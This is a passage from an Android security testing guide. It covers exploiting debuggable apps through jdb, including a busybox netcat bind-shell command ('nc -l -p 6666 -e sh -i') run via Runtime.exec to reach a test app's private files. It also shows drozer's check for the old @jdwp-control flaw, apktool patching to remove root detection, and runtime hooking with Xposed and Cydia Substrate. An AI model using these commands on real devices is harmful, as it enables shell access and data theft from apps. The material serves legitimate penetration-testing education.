### Debugging and Exploiting Debuggable Applications

#### Forwarding the Connection
To forward the connection, use the following command:
```sh
$ adb forward tcp:4444 jdwp:5147
```
After setting up the forwarding, connect to it using `jdb`:
```sh
$ jdb -attach localhost:4444
```
Once connected, set the uncaught exception handling:
```sh
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
```
Initialize `jdb`:
```sh
Initializing jdb ...
>
```
At this point, you have control over the execution flow and can manipulate the application as needed. An attacker might exploit a debuggable application to access protected files. Jay Freeman detailed a reliable method for running operating system commands from within `jdb` on his blog: [http://www.saurik.com/id/17](http://www.saurik.com/id/17).

#### Steps to Run OS Commands from `jdb`

1. **List all threads in the application:**
   ```sh
   > threads
   Group system:
   (java.lang.Thread)0xc1b1db5408  FinalizerWatchdogDaemon cond. waiting
   (java.lang.Thread)0xc1b1db5258  FinalizerDaemon cond. waiting
   (java.lang.Thread)0xc1b1db50f0  ReferenceQueueDaemon cond. waiting
   (java.lang.Thread)0xc1b1db5000  Compiler cond. waiting
   (java.lang.Thread)0xc1b1db4e20  Signal Catcher cond. waiting
   (java.lang.Thread)0xc1b1db4d40  GC cond. waiting
   Group main:
   (java.lang.Thread)0xc1b1addca8  main running
   (java.lang.Thread)0xc1b1db8bc8  Binder_2 running
   (java.lang.Thread)0xc1b1db8ad8  Binder_1 running
   ```

2. **Find the main thread and attach to it:**
   ```sh
   > thread 0xc1b1addca8
   main[1]
   ```

3. **Suspend the thread:**
   ```sh
   main[1] suspend
   All threads suspended.
   ```

4. **Create a breakpoint on `android.os.MessageQueue.next`:**
   ```sh
   main[1] stop in android.os.MessageQueue.next
   Set breakpoint android.os.MessageQueue.next
   ```

5. **Run and cause the breakpoint to hit:**
   ```sh
   main[1] run
   >
   Breakpoint hit: "thread= main", android.os.MessageQueue.next(), line=129 bci=0
   ```
   If the breakpoint does not hit immediately, interact with the application to trigger it.

6. **Execute an operating system command:**
   ```sh
   main[1] print new java.lang.Runtime().exec("/data/local/tmp/busybox nc -l -p 6666 -e sh -i")
   new java.lang.Runtime().exec("/data/local/tmp/busybox nc -l -p 6666 -e sh -i") = "Process[pid=5853]"
   ```

In this example, a `busybox` binary was uploaded to `/data/local/tmp` and made accessible to all applications. The `nc` utility binds a shell to TCP port 6666. To interact with this shell, forward TCP port 6666 to the attached computer and use `nc` on the computer:

```sh
$ adb forward tcp:6666 tcp:6666
$ nc localhost 6666
sh: can't find tty fd: No such device or address
sh: warning: won't have full job control
u0_a53@generic:/ $ cd /data/data/com.mwr.example.sieve
u0_a53@generic:/data/data/com.mwr.example.sieve $ ls -l
drwxrwx--x u0_a53 u0_a53 2014-05-27 08:48 cache
drwxrwx--x u0_a53 u0_a53 2014-05-27 08:48 databases
lrwxrwxrwx install install 2014-05-25 07:11 lib -> /data/app-lib/com.mwr.example.sieve-1
```

### Exploiting Debuggable Applications Without Permissions

In 2011, Nils from MWR InfoSecurity identified a vulnerability in the way debuggable applications verify the debugger they connect to. Debuggable applications look for a UNIX domain socket named `@jdwp-control`. If found, they connect to it and provide debugging rights to the application that owns the socket. However, any application could open this socket and act as a debugger to all debuggable applications on the device.

This issue was present on all Android versions 3.1 and earlier. For a proof of concept on a device running Android 2.3, use the `exploit.jdwp.check` module in drozer:

```sh
dz> run exploit.jdwp.check
[+] Opened @jdwp-control
[*] Accepting connections
[+] com.mwr.dz connected!
[+] Received PID = 3941
[+] This device is vulnerable!
[+] com.mwr.dz connected!
[+] Received PID = 3950
[+] This device is vulnerable!
[+] com.mwr.example.sieve connected!
[+] Received PID = 4003
[+] This device is vulnerable!
[+] com.mwr.example.sieve connected!
[+] Received PID = 4011
[+] This device is vulnerable!
```

These applications connect to the socket and start the transaction required to hand over debugging rights to drozer. Both conditions—being debuggable and having running processes—must be met for a connection.

On an Android 4.0.4 device, the same test shows:

```sh
dz> run exploit.jdwp.check
[+] Opened @jdwp-control
[*] Accepting connections
[+] com.mwr.dz connected!
[-] Did not receive PID...not vulnerable?
[+] com.mwr.dz connected!
[-] Did not receive PID...not vulnerable?
[+] com.mwr.example.sieve connected!
[-] Did not receive PID...not vulnerable?
[+] com.mwr.example.sieve connected!
[-] Did not receive PID...not vulnerable?
```

The processes still connect to the socket but terminate the connection when trying to interact with it. This is due to a fix that adds a check after a debuggable application connects to the `@jdwp-control` socket. The function `socket_peer_is_trusted()` returns whether the socket was created by the shell or root user.

### Additional Testing Techniques

This section provides an overview of testing techniques and tools for tricky scenarios. Applications with layered security measures can be challenging to test. Two common issues are:

1. **Certificate-pinned connections:** Applications that pin their SSL connections to a specific certificate can be difficult to proxy and assess.
2. **Root detection:** Applications may check if they are running on a rooted device or in an emulator, which can limit testing.

#### Patching Applications

One way to disable SSL certificate-pinned connections and root detection is to disassemble the application, remove these features, and reassemble it. A tool like `apktool` can be used for this. Here’s a simple “Hello World” example in smali:

```smali
.class public LHelloWorld;
.super Ljava/lang/Object;
.method public static main([Ljava/lang/String;)V
    .registers 2
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;
    const-string v1, "Hello World!"
    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    return-void
.end method
```

To patch an application, use `apktool` to convert it to smali code, search for and modify the relevant functions, and then reassemble it. For example, to patch the Root Checker application:

1. Convert the application to smali:
   ```sh
   $ java -jar apktool.jar d com.joeykrim.rootcheck.apk rootcheck
   ```

2. Search for the `su` string:
   ```sh
   $ grep -R -i "\"su\"" rootcheck
   ```

3. Modify the relevant smali code to fail the root check.

4. Reassemble the modified contents back to an APK:
   ```sh
   $ java -jar apktool.jar b rootcheck/ rootcheck-modified.apk
   ```

5. Sign the APK:
   ```sh
   $ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore rootcheck-modified.apk alias_name
   ```

#### Manipulating the Runtime

Patching applications can be time-consuming. An alternative is runtime manipulation, which allows for low-level hooks when classes and methods are loaded. Tools like Cydia Substrate and Xposed Framework are useful for this purpose.

##### Tool: Xposed Framework

Xposed Framework, released in 2012, provides functionality for hooking and modifying Android applications at runtime. It has become popular for modding and has an active community creating modules. You can download it from [http://repo.xposed.info/](http://repo.xposed.info/). Xposed works by providing a custom `app_process` binary and can only modify code forked from Zygote.

##### Tool: Cydia Substrate

Cydia Substrate, originally for iOS, was released for Android in 2013. It requires root privileges and provides runtime hooking and modification functionality to other applications. It can modify anything running on an Android device, including native code. For security testing, Cydia Substrate is recommended.

##### Use Case: SSL Certificate Pinning

The Twitter application uses SSL certificate pinning, making it difficult to proxy through tools like Burp. When attempting to load tweets, a toast message appears: “Cannot retrieve Tweets at this time. Please try again later.” This is a well-implemented security measure.